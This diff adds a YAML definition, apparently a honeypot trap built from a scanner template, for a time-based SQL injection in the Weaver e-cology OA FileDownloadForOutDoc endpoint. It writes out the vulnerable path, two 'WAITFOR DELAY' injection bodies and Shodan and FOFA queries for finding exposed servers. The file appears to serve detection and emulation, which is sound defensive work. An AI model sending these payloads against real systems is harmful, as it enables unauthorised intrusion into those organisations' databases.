@@ -1,0 +1,37 @@
+id: ecology-oa-file-sqli
+info:
+  name: E-cology FileDownloadForOutDocSQL - SQL Injection
+  author: momika233
+  description: 'e-cology did not effectively filter the user input, but directly spliced
+    it into the SQL query statement, resulting in SQL injection vulnerabilities in
+    the system
+
+    '
+  severity: high
+  reference:
+  - https://github.com/TgHook/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA%20e-cology%20FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,ecology-oa,sqli
+traps:
+- request:
+    method: POST
+    path: /weaver/weaver.file.FileDownloadForOutDoc
+    headers: {}
+    body: isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:7'
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
+- request:
+    method: POST
+    path: /weaver/weaver.file.FileDownloadForOutDoc
+    headers: {}
+    body: isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:15'
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
